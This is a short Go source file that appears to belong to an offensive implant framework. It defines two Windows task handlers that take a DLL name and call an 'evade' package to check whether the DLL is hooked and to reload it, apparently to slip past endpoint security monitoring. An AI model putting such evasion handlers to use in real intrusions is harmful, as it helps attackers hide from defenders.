//go:build windows
// +build windows

package wintask

import (
	"context"

	"github.com/iDigitalFlame/xmt/cmd/evade"
	"github.com/iDigitalFlame/xmt/data"
)

func check(_ context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	o, err := evade.CheckDLL(s)
	if err != nil {
		return err
	}
	return w.WriteBool(o)
}
func reload(_ context.Context, r data.Reader, _ data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	if err = evade.ReloadDLL(s); err != nil {
		return err
	}
	return nil
}
